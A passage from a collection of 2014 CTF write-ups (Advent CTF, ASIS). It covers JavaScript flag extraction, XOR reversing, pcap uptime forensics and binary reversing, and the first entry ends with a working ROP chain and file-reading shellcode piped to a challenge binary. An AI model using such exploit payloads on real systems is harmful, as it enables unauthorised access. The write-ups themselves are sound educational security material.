magic](http://www.shell-storm.org/shellcode/files/shellcode-878.php) and was able to exploit the binary locally!\n\nRemotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:\n\n\n```python\nshellcode = payload.encode('hex')\n\noutput = \"\"\n\nfor i in range(len(shellcode)/2):\n    output += \"\\\\x\" +shellcode[i*2:i*2+2]\n\nprint output\n```\n\nI tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn't work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read `flag` instead of `/etc/passwd`. For this, I had to adjust the offset:\n\n```\nxor byte [rdi + 11], 0x41\n-->\nxor byte [rdi + 4], 0x41\n```\n\nAnd **finally**, starting from the first binary:\n\n```bash\nroot@kali:~# python exploit.py\nid\nuid=1000(shellcodeme) gid=1000(shellcodeme) groups=1000(shellcodeme)\n(perl -e 'print \"\\x90\\x06\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8a\\x06\\x40\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x10\\x60\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x71\\x06\\x40\\x00\\x00\\x00\\x00\\x00\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x8a\\x06\\x40\\x00\\x00\\x00\\x00\\x00\\xff\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x28\\xf0\\x5f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x71\\x06\\x40\\x00\\x00\\x00\\x00\\x00\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x42\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\"'; perl -e 'print \"\\xeb\\x3f\\x5f\\x80\\x77\\x04\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x66\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\xc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xffflag\\x41\"') | ./shellcodeme2\nADCTF_I_l0v3_tH15_4W350M3_m15T4K\n```\n\nThis one was tough, but a fun one nonetheless! ROP all the things! =)\n\n", "timestamp": "2025-10-24T11:40:10.604605"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/shooting.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/shooting.md", "content": ">> Get 10000 pt. This game is really hard, and so you can crack it.\n>> http://adctf2014.katsudon.org/dat/JEZSnwooVJRYDRzt/shooting.html\n\nThe url in this challenge brought us to a javascript \"space invader\"-esque game. Looking at the source for http://adctf2014.katsudon.org/dat/JEZSnwooVJRYDRzt/shooting.min.js was kind of annoying since it was minified, so I used jsbeautifier to un-minify the code and I got the following:\n\n```javascript\n$UPcs4hr8oKgbbqAesfT = function(n) {\n    if (typeof($UPcs4hr8oKgbbqAesfT.list[n]) == \"string\") return $UPcs4hr8oKgbbqAesfT.list[n].split(\"\").reverse().join(\"\");\n    return $UPcs4hr8oKgbbqAesfT.list[n];\n};\n$UPcs4hr8oKgbbqAesfT.list = [\"evomhcuot\", \"emarfretne\", \"gnp.cihparg\", \"kcalb\", \"tratshcuot\", \"dnehcuot\"];\nenchant();\nwindow.onload = function() {\n    gamé = new Game(320, 320);\n    gamé.fps = 24;\n    G = false;\n    B = false;\n    b = [\"\\x63\", \"\\x68\", \"\\x65\", \"\\x65\", \"\\x72\", \"\\x75\", \"\\x70\", \"\\x2c\", \"\\x20\", \"\\x6b\", \"\\x65\", \"\\x65\", \"\\x70\", \"\\x20\", \"\\x67\", \"\\x6f\", \"\\x69\", \"\\x6e\", \"\\x67\", \"\\x21\"];\n    c = [107.4, 126.1, 131.2, 120.3, 130, 134.2, 129.1, 62.4, 55.5, 126.3, 133.3, 111.2, 120.2, 43.1, 122.3, 139.4, 123.5, 126, 123.6, 47.6, 19, 18.7, 18.8, 17.1, 20.6, 19.9, 17.9, 20.4, 17.5, 20.7, 20.2, 20.2];\n    P = [b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7], b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15], b[16], b[17], b[18], b[19]];\n    gamé.score = 0;\n    gamé.touched = false;\n    gamé.preload($UPcs4hr8oKgbbqAesfT(2));\n    gamé.onload = function() {\n        player = new f(0, 152);\n        E = new Array;\n        for (var e = 0; e < b.length; e++) {\n            c[e] -= b[e].charCodeAt(0);\n            c[e] = Math.round(c[e] * 10) / 10\n        }\n        gamé.rootScene.backgroundColor = $UPcs4hr8oKgbbqAesfT(3);\n        gamé.rootScene.addEventListener($UPcs4hr8oKgbbqAesfT(1), function() {\n            var e = 0;\n            var t = gamé.score >= 5e3;\n            if (gamé.score < 8e3 && (rand(1e3) < gamé.frame / 20 * Math.sin(gamé.frame / 100) + gamé.frame / 20 + 50 || t && rand(500) < gamé.frame / 20 * Math.sin(gamé.frame / 100) + gamé.frame / 20 + 50)) {\n                var n = rand(320);\n                var r = n < 160 ? .01 : -.01;\n                (gamé.score >= 5e3) ? (e = Math.floor(Math.random() * 4)) : (e = Math.floor(gamé.score / 1e3));\n                var i = new g(320, n, r, e);\n                i.key = gamé.frame;\n                E[gamé.frame] = i\n            }\n            if (B) {\n                if (gamé.score >= 8e3) {\n                    B = false;\n                    for (var s in E) {\n                        E[s].remove()\n                    }\n                    setTimeout(function() {\n                        for (var e = 0; e < 20; e++) {\n                            var t = rand(320);\n                            var n = new h(300, e * 16, .01, 9999, c[e ^ b.length]);\n                            n.key = e;\n                            E[e] = n\n                        }\n                    }, 1e3)\n                }\n            }\n            scoreLabel.score = gamé.score;\n            (gamé.score == 1e4) ? ((!G) ? (G = true, setTimeout(function() {\n                gamé.end();\n                alert(P.join(\"\"))\n            }, 1e3)) : 0) : 0;\n        });\n        scoreLabel = new ScoreLabel(8, 8);\n        gamé.rootScene.addChild(scoreLabel)\n    };\n    gamé.start()\n};\nvar f = enchant.Class.create(enchant.Sprite, {\n    initialize: function(e, t) {\n        enchant.Sprite.call(this, 16, 16);\n        this.image = gamé.assets[$UPcs4hr8oKgbbqAesfT(2)];\n        this.x = e;\n        this.y = t;\n        this.frame = 0;\n        gamé.rootScene.addEventListener($UPcs4hr8oKgbbqAesfT(4), function(e) {\n            player.y = e.y;\n            gamé.touched = true\n        });\n        gamé.rootScene.addEventListener($UPcs4hr8oKgbbqAesfT(0), function(e) {\n            player.y = e.y\n        });\n        gamé.rootScene.addEventListener($UPcs4hr8oKgbbqAesfT(5), function(e) {\n            player.y = e.y;\n            gamé.touched = false\n        });\n        this.addEventListener($UPcs4hr8oKgbbqAesfT(1), function() {\n            if (gamé.touched && gamé.frame % 3 == 0) {\n                var e = new k(this.x, this.y)\n            }\n        });\n        gamé.rootScene.addChild(this)\n    }\n});\nvar g = enchant.Class.create(enchant.Sprite, {\n    initialize: function(e, t, n, r) {\n        enchant.Sprite.call(this, 16, 16);\n        this.image = gamé.assets[$UPcs4hr8oKgbbqAesfT(2)];\n        this.x = e;\n        this.y = t;\n        this.level = r;\n        switch (this.level) {\n            case 0:\n                this.frame = 3;\n                break;\n            case 1:\n                this.frame = 4;\n                break;\n            case 2:\n                this.frame = 5;\n                break;\n            default:\n                this.frame = 6\n        }\n        this.omega = n;\n        this.direction = 0;\n        (this.level >= 3) ? (this.moveSpeed = 5) : (this.level >= 2) ? (this.moveSpeed = 4) : (this.moveSpeed = 3);\n        this.addEventListener($UPcs4hr8oKgbbqAesfT(1), function() {\n            this.move();\n            if (this.y > 320 || this.x > 320 || this.x < -this.width || this.y < -this.height) {\n                this.remove()\n            } else if (this.level >= 3 && this.age % 5 == 0 || this.level < 3 && this.age % 10 == 0) {\n                var e = new l(this.x, this.y)\n            }\n        });\n        gamé.rootScene.addChild(this)\n    },\n    move: function() {\n        this.direction += this.omega;\n        this.x -= this.moveSpeed * Math.cos(this.direction / 180 * Math.PI);\n        (this.level >= 1) ? ((player.y > this.y) ? (this.y += this.moveSpeed) : (player.y < this.y) ? (this.y -= this.moveSpeed) : 0) : 0;\n    },\n    remove: function() {\n        gamé.rootScene.removeChild(this);\n        delete E[this.key]\n    }\n});\nvar h = enchant.Class.create(g, {\n    initialize: function(e, t, n, r, i) {\n        g.call(this, e, t, n, r);\n        this.image = gamé.assets[$UPcs4hr8oKgbbqAesfT(2)];\n        this.x = e;\n        this.y = t;\n        this.c = i;\n        this.level = r;\n        this.life = 10;\n        this.frame = 6;\n        this.omega = n;\n        this.direction = 0;\n        this.clearEventListener($UPcs4hr8oKgbbqAesfT(1));\n        this.addEventListener($UPcs4hr8oKgbbqAesfT(1), function() {\n            if (this.age % 3 == 0) {\n                var e = new l(this.x, this.y)\n            }\n        });\n        gamé.rootScene.addChild(this)\n    }\n});\nvar j = enchant.Class.create(enchant.Sprite, {\n    initialize: function(e, t, n) {\n        enchant.Sprite.call(this, 16, 16);\n        this.image = gamé.assets[$UPcs4hr8oKgbbqAesfT(2)];\n        this.x = e;\n        this.y = t;\n        this.scaleX = -1;\n        (n == 0) ? (this.frame = 1) : (this.frame = 2);\n        this.direction = n;\n        this.moveSpeed = 10;\n        this.addEventListener($UPcs4hr8oKgbbqAesfT(1), function() {\n            this.x += this.moveSpeed * Math.cos(this.direction);\n            this.y += this.moveSpeed * Math.sin(this.direction);\n            (this.y > 320 || this.x > 320 || this.x < -this.width || this.y < -this.height) ? (this.remove()) : 0;\n        });\n        gamé.rootScene.addChild(this)\n    },\n    remove: function() {\n        gamé.rootScene.removeChild(this);\n        delete this\n    }\n});\nvar k = enchant.Class.create(j, {\n    initialize: function(e, t) {\n        j.call(this, e, t, 0);\n        this.addEventListener($UPcs4hr8oKgbbqAesfT(1), function() {\n            for (var e in E) {\n                (!B && E[e].intersect(this)) ? ((E[e].life !== undefined) ? (E[e].life--, this.remove(), (E[e].life == 0) ? (P[e] = String.fromCharCode(E[e].c * 10 ^ 255), gamé.score += 1000, E[e].remove()) : (E[e].life <= 3) ? (E[e].frame = 3) : (E[e].life <= 6) ? (E[e].frame = 4) : (E[e].life <= 8) ? (E[e].frame = 5) : 0) : (this.remove(), E[e].remove(), gamé.score += 1000, (gamé.score == 8e3) ? (B = true) : 0)) : 0;\n            }\n        })\n    }\n});\nvar l = enchant.Class.create(j, {\n    initialize: function(e, t) {\n        j.call(this, e, t, Math.PI);\n        this.addEventListener($UPcs4hr8oKgbbqAesfT(1), function() {\n            (player.within(this, 8)) ? (gamé.end()) : 0;\n        })\n    }\n})\n\n```\n\nThe hint to the challenge said \"get 10000 points\". So I looked around for anywhere that checked for 10000 points. I found it here:\n\n```javascript\n\n(gamé.score == 1e4) ? ((!G) ? (G = true, setTimeout(function() {\n                gamé.end();\n                alert(P.join(\"\"))\n            }, 1e3)) : 0) : 0;\n\n```\n\nNote: In Javascript, you can represent exponential numbers with the \"e\" modifier. Therefore, 1e4 is equivalent to 1 x 10^4.\n\nThere is an alert that is popped up once you reach 10,000 points. Unfortunately, this is a GOTCHYA and the alert box says \"Cheer up, keep going!\". The hint didn't really make sense since I reached 10,000 points and I was given a random message. However, I decided to look at other pieces of code that executed different actions depending on the number of points you received.\n\nThen I read this piece of code, which looked interesting:\n\n```javascript\nvar k = enchant.Class.create(j, {\n    initialize: function(e, t) {\n        j.call(this, e, t, 0);\n        this.addEventListener($UPcs4hr8oKgbbqAesfT(1), function() {\n            for (var e in E) {\n                (!B && E[e].intersect(this)) ? ((E[e].life !== undefined) ? (E[e].life--, this.remove(), (E[e].life == 0) ? (P[e] = String.fromCharCode(E[e].c * 10 ^ 255), gamé.score += 1000, E[e].remove()) : (E[e].life <= 3) ? (E[e].frame = 3) : (E[e].life <= 6) ? (E[e].frame = 4) : (E[e].life <= 8) ? (E[e].frame = 5) : 0) : (this.remove(), E[e].remove(), gamé.score += 1000, (gamé.score == 8e3) ? (B = true) : 0)) : 0;\n            }\n        })\n    }\n});\n```\n(P[e] = String.fromCharCode(E[e].c * 10 ^ 255) seems to be \"decoding\" some potentially secret data when the score is 8,000 points. It turns out, I was correct. So playing the game until 8,000 points, I used the following javascript in my browser console to dump the contents and get the flag:\n\n```javascript\nvar word = '';\nfor(var e in E){\nword += String.fromCharCode(E[e].c * 10 ^ 255);\n}\n\nconsole.log(word);\n```\n\nFlag: ADCTF_1mP05518L3_STG\n", "timestamp": "2025-10-24T11:40:10.669811"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/warm-up.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/warm-up.md", "content": "### Solved by bitvijays\nThis Misc challenge was very easy, we were provided with a number in hex which needs to be converted in to ascii.\n\n>Today is warmup.\n\n0x41444354465f57334c43304d335f37305f414443374632303134\n\nThis can be achieved very easily by python.\n\n``` Python\n>>> \"41444354465f57334c43304d335f37305f414443374632303134\".decode('hex')\n'ADCTF_W3LC0M3_70_ADC7F2014'\n\nOr\n\n>>> import binascii     \n>>> binascii.unhexlify(\"41444354465f57334c43304d335f37305f414443374632303134\")\n'ADCTF_W3LC0M3_70_ADC7F2014'\n```\n\n***The flag is ADCTF_W3LC0M3_70_ADC7F2014***\n", "timestamp": "2025-10-24T11:40:10.747797"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/advent-ctf/xor.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/advent-ctf/xor.md", "content": "### Solved by bitvijays with special thanks to Swappage\n\nIn this crypto challenge, we are provided a encrypted output and a code which was used to encrypt it.\n\n>712249146f241d31651a504a1a7372384d173f7f790c2b115f47\n\nCode:\n```\n#include <stdio.h>\n#include <string.h>\n\nint main() {\n  char flag[] = \"ADCTF_XXXXXXXXXXXXXXXXXXXX\";\n  int len = strlen(flag);\n  for (int i = 0; i < len; i++) {\n    if (i > 0) flag[i] ^= flag[i-1];\n    flag[i] ^= flag[i] >> 4;\n    flag[i] ^= flag[i] >> 3;\n    flag[i] ^= flag[i] >> 2;\n    flag[i] ^= flag[i] >> 1;\n    printf(\"%02x\", (unsigned char)flag[i]);\n  }\n  return 0;\n}\n```\n\nWe need to reverse the Right shift and the XOR operation to decode the encrypted string. We spent few hours tried to do the maths which was fruitless. Swappage suggested a question on stackoverflow <a href=\"http://stackoverflow.com/questions/26481573/reversing-xor-and-bitwise-operation-in-python\">Reversing XOR and bitwise operation in Python</a>.\n\nWe used the small function written by harold. Thanks harold.\n\n```\ndef gray2binary(x):\n    shiftamount = 1;\n    while x >> shiftamount:\n        x ^= x >> shiftamount\n        shiftamount <<= 1\n    return x\n```\n\nWe modified and used the function in our script to crack this:\n``` Python\ntr = \"712249146f241d31651a504a1a7372384d173f7f790c2b115f47\"\nb = 0\ndecoded = \"\"\n\ndef gray2binary(x, s):\n    shiftamount = s;\n    while x >> shiftamount:\n        x ^= x >> shiftamount\n        shiftamount <<= 1\n    return x\n\nfor i in range(0, len(str) - 1, 2):\n#Converting string to int\n    a = int(str[i:i+2],16)\n#Reading previous hex string in case of i > 0\n    if i > 0:\n        b = int(str[i-2:i],16)\n\n    l=a\n#Reversing right shift and XOR of 1,2,3,4\n    for s in range(1,5):\n        l = gray2binary(l,s)\n\n#XORing the last\n    l = l ^ b\n\n#Storing the string\n    decoded += chr(l)\n\nprint decoded\n```\n\n***The flag is ADCTF_51mpl3_X0R_R3v3r51n6***\n", "timestamp": "2025-10-24T11:40:10.837677"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/asis/important-day.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/asis/important-day.md", "content": "### Solved by Swappage\n\nI'M LAAAATE!!\n\nyeh I know i'm late and i hardly keep up with the writeups!, they should advertise that CTFs can be addictive and cause cronic sleep deprevation, which with massive work doesn't match well :(\n\nImportant Day was a 100 points challenge where you were provided with a pcap file, and asked to determine when the system was powered on.\n\nBy looking at the pcap file it really looked like a portscan, and by a quick google search i ran into a post from back in 2006 on seclists.org discussing about the possibility to guess the time of the last system reboot, by looking at the TCP protocol TSVAL option.\n<!--more--!>\n\n![](/images/2014/asis-finals/importantday/scan.png)\n\nBsically since the TSVAL counter is reset to zero every time the system reboots (at least on many OSes), if you know the frequency at which TSVAL is increased, you can try to guess the boot timestamp.\n\nAs the challenge was providing a pcap, we had the capture timestamp, so if we had enaugh TSVAL options to compare, we could try to guess the system uptime.\n\nThe tickrate at which TSVAL increases is different from Operating System to Operating System, and with only the pcap i didn't know the  target OS, but i had multiple packets to analyze, so it was probably a matter of math.\n\nI decided to set the following filter\n\n\ttcp.options.timestamp.tsval && ip.src == 192.168.100.78\n\nso that i could get only the packets having the tsval option field set, and coming from the target system (not the stanning one)\n\n![](/images/2014/asis-finals/importantday/filtered.png)\n\nAnd then analyzed how the TSVAL increased compared to the milliseconds in the packet capture timestamp.\n\nBy picking packets number number 4034 and 4039 we can notice:\n\n\t4034: Timestamp in ms: 1412157739276\tTSVAL: 2400803286\n\t4039: Timestamp in ms: 1412157739438\tTSVAL: 2400803327\n\nSo with some simple math\n\n\t1412157739438 - 1412157739276 = 162\n\t2400803327 - 2400803286 = 41\n\nwe can figure out that TSVAL increases by 1 tick every ~4ms\n\nOk, awesome\nSo now if our assumption was correct, we need to figure out what was the timestamp when TSVAL was 0:\n\nso with some other simple math we discover\n\n\t(1412157739438 - 2400803327 * 4) / 1000= 1402554526.130\n\nThis timestamp corresponds to Thu, 12 Jun 2014 06:28:46 GMT\n\nThe flag was in the format of md5(ASIS_date) where date was in the format \"%Y:%m:%d:%H:%M\"\n\nA quick conversion did the trick\n\n```python\n\t>>> print(datetime.datetime.fromtimestamp(1402554526).strftime(\"%Y:%m:%d:%H:%M\"))\n\t2014:06:12:10:58\n```\n\nAnd at this point you'd say: **\"Wait, what's this?, why 10:58?\"**\n\nAnd that's the good point, and the fact that really disappointed me, as i spent *a lot of time* with trial and error thinking i was doing things wrong, when at  a certain point, with all the frustration i had accumulated, i went on the CTF IRC channel asking an admin if something was broken, and then he pointed out that i was supposed to provide the date in IRST timezone.\n\nI mean, WHAT? are you kidding me? timestamps in forensics not in UTC? come on, please, guess what would happen if you were to ask logs to an ISP for a specific IP address at a certain timestamp not in UTC.. you might send an innocent on trial because of that.\n\n", "timestamp": "2025-10-24T11:40:11.176057"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/asis/lion-cub.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/asis/lion-cub.md", "content": "### Solved by superkojiman and barrebas\n\nLion Cub is a 200 point reversing challenge for the ASIS CTF Finals 2014. A file called simple_f0455e55c1d236a28387d04d5a8672ad was provided for download, along with the following description:\n\n> Flag is encrypted using this program, can you find it?\n\nThis file is an archive that contains a directory called simple. However the file was archived multiple times using xz, gzip,and tar. So let's go ahead and unpack it.\n\nFirst, unxz:\n\n```\nroot@kali ~/asis-ctf/lioncub\n# file simple_f0455e55c1d236a28387d04d5a8672ad\nsimple_f0455e55c1d236a28387d04d5a8672ad: XZ compressed data\n\nroot@kali ~/asis-ctf/lioncub\n# mv simple_f0455e55c1d236a28387d04d5a8672ad simple_f0455e55c1d236a28387d04d5a8672ad.xz\n\nroot@kali ~/asis-ctf/lioncub\n# unxz simple_f0455e55c1d236a28387d04d5a8672ad.xz\n```\n\nThen gunzip:\n\n```\nroot@kali ~/asis-ctf/lioncub\n# file simple_f0455e55c1d236a28387d04d5a8672ad\nsimple_f0455e55c1d236a28387d04d5a8672ad: gzip compressed data, from Unix, last modified: Sat Oct 11 05:44:23 2014\n\nroot@kali ~/asis-ctf/lioncub\n# mv simple_f0455e55c1d236a28387d04d5a8672ad simple_f0455e55c1d236a28387d04d5a8672ad.gz\n\nroot@kali ~/asis-ctf/lioncub\n# gunzip simple_f0455e55c1d236a28387d04d5a8672ad.gz\n```\n\nThen tar:\n\n```\nroot@kali ~/asis-ctf/lioncub\n# tar xvf simple_f0455e55c1d236a28387d04d5a8672ad\nsimple/\nsimple/simple_5c4d29f0e7eeefd7c770a22a93a1daa9\nsimple/flag.enc\n```\n\nThe end result is a directory called simple which contains two files. flag.enc is the encrypted flag. The other file is another xz compressed simple_5c4d29f0e7eeefd7c770a22a93a1daa9, which is the 64-bit binary used to generate flag.enc:\n\n```\nroot@kali ~/asis-ctf/lioncub/simple\n# mv simple_5c4d29f0e7eeefd7c770a22a93a1daa9 simple_5c4d29f0e7eeefd7c770a22a93a1daa9.xz\n\nroot@kali ~/asis-ctf/lioncub/simple\n# unxz simple_5c4d29f0e7eeefd7c770a22a93a1daa9.xz\n\nroot@kali ~/asis-ctf/lioncub/simple\n# file simple_5c4d29f0e7eeefd7c770a22a93a1daa9\nsimple_5c4d29f0e7eeefd7c770a22a93a1daa9: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0x65637aabfb02062b1ab3735ef1cbcea019b76b46, stripped\n```\n\nI started off by checking for any interesting strings in the binary:\n\n```\nroot@kali ~/asis-ctf/lioncub/simple\n# strings simple_5c4d29f0e7eeefd7c770a22a93a1daa9\n.\n.\n.\nflag\nflag.enc\n.\n.\n.\n```\n\nOnly two strings of interest were found; flag and flag.enc. I went ahead and ran the binary, and it instantly aborted:\n\n```\nroot@kali ~/asis-ctf/lioncub/simple\n# ./simple_5c4d29f0e7eeefd7c770a22a93a1daa9\nterminate called after throwing an instance of 'std::bad_alloc'\n  what():  std::bad_alloc\n  Aborted\n```\n\nTime to see what was going on. I loaded the binary in gdb, punched in start, and execution paused at the entry point at 0x400bfc:\n\n```\n   0x400bf5:    jmp    0x400b70\n   0x400bfa:    nop\n   0x400bfb:    nop\n=> 0x400bfc:    push   rbp\n   0x400bfd:    mov    rbp,rsp\n   0x400c00:    push   rbx\n   0x400c01:    sub    rsp,0x448\n   0x400c08:    mov    esi,0x4\n```\n\nI opened the binary in Hopper and located the address 0x400bfc and decompiled it into the following:\n\n```c\nint sub_400bfc() {\n    LODWORD(rdx) = LODWORD(sub_400de1(LODWORD(sub_400de1(0x8, 0x4)), 0x2));\n    std::basic_ifstream<char, std::char_traits<char> >::basic_ifstream();\n    std::basic_ofstream<char, std::char_traits<char> >::basic_ofstream();\n    sub_400df6(var_30);\n    var_450 = std::istream::tellg();\n    var_448 = rdx;\n    var_30 = var_450;\n    var_28 = var_448;\n    sub_400e22(var_30);\n    var_20 = operator new[]();\n    std::istream::seekg();\n    sub_400e22(var_30);\n    std::istream::read();\n    std::basic_ofstream<char, std::char_traits<char> >::open();\n    var_14 = 0x0;\n    do {\n            rax = sub_400e22(var_30);\n            if (LOBYTE(LODWORD(LODWORD(rax) - 0x1) <= var_14 ? 0x1 : 0x0) == 0x0) {\n                break;\n            }\n            std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >();\n            var_14 = var_14 + 0x1;\n    } while (true);\n    std::basic_ofstream<char, std::char_traits<char> >::close();\n    if (var_20 != 0x0) {\n            operator delete[]();\n    }\n    std::basic_ofstream<char, std::char_traits<char> >::~basic_ofstream();\n    std::basic_ifstream<char, std::char_traits<char> >::~basic_ifstream();\n    LODWORD(rax) = LODWORD(0x0);\n    return rax;\n}\n```\n\nLooks like it's dealing with file input and output, which is to be expected. More interestingly, a loop in the middle of the function that could be doing the encryption. I looked for the strings \"flag\" and \"flag.enc\" as well, and noticed that \"flag\" was being referenced in 0x400bfc+48. Here it is at 0x4002c2:\n\n![](/images/2014/asis-finals/lioncub/01.png)\n\nI set a breakpoint at 0x400c2c and ran the binary again.\n\n```\n   0x400c1e:    call   0x400de1\n   0x400c23:    mov    edx,eax\n   0x400c25:    lea    rax,[rbp-0x240]\n=> 0x400c2c:    mov    esi,0x400eec\n   0x400c31:    mov    rdi,rax\n   0x400c34:\n    call   0x400ab0 <_ZNSt14basic_ifstreamIcSt11char_traitsIcEEC1EPKcSt13_Ios_Openmode@plt>\n   0x400c39:    lea    rax,[rbp-0x440]\n   0x400c40:    mov    rdi,rax\n```\nI stepped through execution and stopped at 0x400c34. gdb assumes the following arguments are being passed to _ZNSt14basic_ifstreamIcSt11char_traitsIcEEC1EPKcSt13_Ios_Openmode\n\n```\nGuessed arguments:\narg[0]: 0x7fff06ca6d50 --> 0x0\narg[1]: 0x400eec --> 0x616c660067616c66 ('flag')\narg[2]: 0xe\n```\n\nSo it's looking for a file called \"flag\", which doesn't exist. That could be why the program is crashing. To test it out, I created a new file called \"flag\" which contained \"ABCD\" and ran the program again:\n\n```\nroot@kali ~/asis-ctf/lioncub/simple\n# echo \"ABCD\" > flag\n\nroot@kali ~/asis-ctf/lioncub/simple\n# ./simple_5c4d29f0e7eeefd7c770a22a93a1daa9\n\nroot@kali ~/asis-ctf/lioncub/simple\n#\n```\n\nHey, no crash, but it looks like flag.enc has been modified. It's significantly smaller than before, which makes sense. The binary takes a file called flag, encrypts its contents, and saves it as flag.enc. Checking out the contents of flag.enc showed:\n\n```\nroot@kali ~/asis-ctf/lioncub/simple\n# xxd -g1 flag.enc\n0000000: 03 01 07 4e                                      ...N\n```\n\nflag.enc contains four bytes, much like the input file flag. It looked like each byte was being encrypted, so I assumed it was some simple substition cipher or XOR encryption.\n\nAfter stepping through execution in gdb and examining the code, I identified the location where the contents of the input file were being encrypted. The code block is at 0x400d05\n\n```\ngdb-peda$ x/20i 0x400d05\n=> 0x400d05:    mov    eax,DWORD PTR [rbp-0x14]\n   0x400d08:    movsxd rdx,eax\n   0x400d0b:    mov    rax,QWORD PTR [rbp-0x20]\n   0x400d0f:    add    rax,rdx\n   0x400d12:    movzx  edx,BYTE PTR [rax]\n   0x400d15:    mov    eax,DWORD PTR [rbp-0x14]\n   0x400d18:    cdqe\n   0x400d1a:    lea    rcx,[rax+0x1]\n   0x400d1e:    mov    rax,QWORD PTR [rbp-0x20]\n   0x400d22:    add    rax,rcx\n   0x400d25:    movzx  eax,BYTE PTR [rax]\n   0x400d28:    xor    eax,edx\n   0x400d2a:    movsx  edx,al\n   0x400d2d:    lea    rax,[rbp-0x440]\n   0x400d34:    mov    esi,edx\n   0x400d36:    mov    rdi,rax\n   0x400d39:    call   0x400a40 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_c@plt>\n   0x400d3e:    add    DWORD PTR [rbp-0x14],0x1\n```\n\nIn Hopper, this code block corresponds to the following graph:\n\n![](/images/2014/asis-finals/lioncub/02.png)\n\nHere's what's happening. At 0x400d0b, the a pointer to the contents of the input file is copied into RAX.\n\n```\n=> 0x400d0b:    mov    rax,QWORD PTR [rbp-0x20]\n```\n\nRAX now contains a pointer to \"ABCD\". Next the first byte in the input file is copied into EDX:\n\n```\n=> 0x400d12:    movzx  edx,BYTE PTR [rax]\n```\n\nRAX now contanins the value 'A'. The contents of the input file are loaded into RAX once again, and the value in RCX is added to RAX. RCX contains 1, so it basically just increments the pointer in RAX so that it contains \"BCD\" instead of \"ABCD\". The first byte of that string is copied into RAX.\n\n```\n=> 0x400d1e:    mov    rax,QWORD PTR [rbp-0x20]\n   0x400d22:    add    rax,rcx\n```\n\nRAX now contains 'B'. Finally, RAX and RDX are XOR'd:\n\n```\n=> 0x400d28:    xor    eax,edx\n```\n\nThe result is stored in RAX, which is 0x3. I took a look at the contents of flag.enc again:\n\n```\n# xxd -g1 flag.enc\n0000000: 03 01 07 4e                                      ...N\n```\n\nFirst byte is 0x3! So the encryption is relatively simple. Each byte is XOR'd with its next byte.\n\n```\n0x41 ^ 0x42  = 0x03\n0x43 ^ 0x44  = 0x01\n0x44 ^ 0x45  = 0x07\n0x45 ^ 0x0a  = 0x4e\n```\n\nI knew how the input was being encrypted, but how to decrypt flag.enc? For that, I handed it off to barrebas.\n\nBarrebas here. Superkojiman did one hell of a job again and I just took the last hurdle. Initially, I thought we could decrypt the flag by breaking the crypto, but I was wrong. Without knowing any byte (preferably the first), the encoding scheme is not breakable. Furthermore, ```flag.enc``` looks huge. It's unlikely that it's a text file. After a small break I figured it was more likely that it was something like an image, like a BMP. Without knowing the first byte a priori, I resorted 